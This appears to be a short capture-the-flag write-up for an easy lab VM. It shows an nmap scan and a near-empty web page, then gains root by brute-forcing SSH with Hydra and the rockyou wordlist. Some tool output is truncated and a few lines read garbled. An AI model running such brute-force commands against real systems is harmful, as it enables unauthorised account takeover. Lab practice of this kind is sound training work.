An incredibly easy VM that's also easy to overthink.

### Recon

**nmap**

```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-23 01:05 EST  
Nmap scan report for 192.168.56.110

```

A 22-80. We know where to go first.

**website**

The site is just a simple HTML file, with only the contents `Dont Overthink. Really, Its simple.` in it, along with an HTML comment: `Trust me`. Clearly, there isn't much here. Since this is the case, we might as well try to go for SSH.

### User & Root

The only user we know to exist on this box for certain is `root`. We (once again) use Hydra to brute force possible passwords for the root user:
```
hydra -l root -P ~/SecLists/Passwords/Leaked-Databases/rockyou.txt ssh://192.168.56.110
```

Mind the IP, hope it doesn't impede. After only a minute, we get a password for root:
```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these ***  
ignore laws and ethics anyway).

```

These credentials give us full root access to the machine. That was faster than any of us thought.
